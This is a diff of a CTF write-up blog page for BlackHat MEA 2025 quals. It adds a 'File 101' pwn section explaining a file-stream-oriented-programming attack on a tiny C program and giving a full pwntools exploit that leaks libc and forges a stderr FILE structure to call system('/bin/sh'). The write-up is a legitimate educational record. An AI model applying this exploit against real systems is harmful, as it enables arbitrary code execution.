@@ -139,8 +139,8 @@
 <meta property="og:description" content="Try HARDER !">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://depe.blog/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-09-09T23:07:12.000Z">
-<meta property="article:modified_time" content="2025-09-10T00:26:50.533Z">
+<meta property="article:published_time" content="2025-09-09T22:07:12.000Z">
+<meta property="article:modified_time" content="2025-12-06T10:22:43.922Z">
 <meta property="article:author" content="Depe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://depe.blog/images/redefine-og.webp">
@@ -313,7 +313,7 @@
 
         <div class="statistics flex justify-around my-2.5">
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
         <div class="label text-third-text-color text-sm">Tags</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
@@ -321,7 +321,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -372,8 +372,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-10 02:26:50</span>
-            <span class="mobile">2025-09-10 02:26:50</span>
+            <span class="desktop">2025-12-06 12:22:43</span>
+            <span class="mobile">2025-12-06 12:22:43</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -400,8 +400,29 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>I recently participated in Blackhat mea ctf 2025 quals. These are the write-ups of the Web challenges that I solved. I hope you will learn something new.</p>
+			<p>I recently participated in Blackhat mea ctf 2025 quals. These are the write-ups of the Web challenges + File 101 pwn challenge that I solved. I hope you will learn something new.</p>
 <p>Happy Hacking!!</p>
+<h1 id="File-101"><a href="#File-101" class="headerlink" title="File 101"></a>File 101</h1><p>We were provided with a small set of files to poke at:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── chall</span><br><span class="line">├── compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── main.c</span><br></pre></td></tr></table></figure></div>
+<p>main.c</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;stdout:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%224s&quot;</span>, (<span class="type">char</span>*)<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;stderr:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%224s&quot;</span>, (<span class="type">char</span>*)<span class="built_in">stderr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="What-the-Code-Is-Actually-Doing"><a href="#What-the-Code-Is-Actually-Doing" class="headerlink" title="What the Code Is Actually Doing"></a>What the Code Is Actually Doing</h1><p>At first glance, the program looks too small to hide anything interesting — but that tiny scanf call is doing something unbelievably reckless.</p>
+<p>After turning off buffering for stdin&#x2F;out, the binary does:</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%224s&quot;</span>, (<span class="type">char</span>*)<span class="built_in">stdout</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%224s&quot;</span>, (<span class="type">char</span>*)<span class="built_in">stderr</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>It literally treats the internal stdout and stderr objects as writable buffers and lets the user shove 224 bytes into them.<br>These aren’t normal buffers — they’re FILE structures used by libc to track stream state: vtable pointers, flags, buffer positions, mode bits, everything. Blindly overwriting them means we basically get to hijack libc’s file-handling machinery.</p>
+<p>This is exactly what FSOP (File Stream Oriented Programming) is about: you poison an <code>_IO_FILE</code> object so that the next time libc interacts with it (flush, close, write…), your carefully staged fake structure redirects to shellcode.</p>
+<h1 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h1><ul>
+<li>smash stdout to force a libc pointer leak</li>
+<li>use the leak to compute the actual libc base</li>
+<li>corrupt stderr into a forged FILE object where the vtable points to something juicy</li>
+<li>make libc “use” that FILE, and execution jumps into system(“&#x2F;bin&#x2F;sh”)</li>
+</ul>
+<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf  = context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u64leak</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(x.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(<span class="string">&quot;&lt;HOST&gt;&quot;</span>, &lt;PORT&gt;)</span><br><span class="line">    <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line">r = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Corrupt stdout first</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;stdout:\n&quot;</span>)</span><br><span class="line">r.sendline(p64(<span class="number">0xfbad1887</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">b&quot;\x48&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Grab the info leak from libc internals</span></span><br><span class="line">leak = r.recvuntil(<span class="string">b&quot;stder&quot;</span>)[-<span class="number">72</span>:]</span><br><span class="line">libc.address = u64leak(leak[:<span class="number">8</span>]) - <span class="number">0x204644</span></span><br><span class="line">log.success(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">stderr_addr = libc.address + <span class="number">0x2044e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Craft our poisoned _IO_FILE object for stderr</span></span><br><span class="line">fs  = p64(<span class="number">0x3b68733b40404040</span>)</span><br><span class="line">fs += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fs += p64(libc.sym.system) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fs += p64(stderr_addr - <span class="number">0x10</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fs += p64(stderr_addr) + p64(stderr_addr - <span class="number">0x48</span>)</span><br><span class="line">fs += p64(<span class="number">0</span>)*<span class="number">6</span> + p64(libc.sym._IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line">r.sendline(fs)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+
+
 <h1 id="koko-WAF"><a href="#koko-WAF" class="headerlink" title="koko WAF"></a>koko WAF</h1><p>we were given the challenge files and the source code for the whole web application to analyze </p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ tree kokowaf-player </span><br><span class="line">kokowaf-player</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── init.db</span><br><span class="line">├── init.sh</span><br><span class="line">└── src</span><br><span class="line">    ├── db.php</span><br><span class="line">    ├── index.php</span><br><span class="line">    ├── profile.php</span><br><span class="line">    ├── register.php</span><br><span class="line">    └── waf.php</span><br></pre></td></tr></table></figure></div>
 <p>looking at <code>waf.php</code></p>
@@ -454,7 +475,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-10 02:26:50
+                    :</strong> 2025-12-06 12:22:43
             </li>
         
         <li>
@@ -484,12 +505,12 @@
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
 			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/xor/">
+				<a class="prev" rel="prev" href="/eMAPTv2-review/">
 					<span class="left arrow-icon flex justify-center items-center">
 						<i class="fa-solid fa-chevron-left"></i>
 					</span>
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">xor</span>
+						<span class="post-nav-title-item truncate max-w-48">eMAPTv2-review</span>
 						<span class="post-nav-item">Prev posts</span>
 					</span>
 				</a>
@@ -562,7 +583,7 @@
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
 		<div class="page-title">BlackHat mea Quals 2025 — Web challenges</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#koko-WAF"><span class="nav-text">koko WAF</span></a></li></ol>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#File-101"><span class="nav-text">File 101</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#What-the-Code-Is-Actually-Doing"><span class="nav-text">What the Code Is Actually Doing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Theory"><span class="nav-text">Theory</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#koko-WAF"><span class="nav-text">koko WAF</span></a></li></ol>
 
 	</div>
 </div>
@@ -589,7 +610,7 @@
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        6 posts in total
+                        4 posts in total
                     </span>
                     
                 </p>
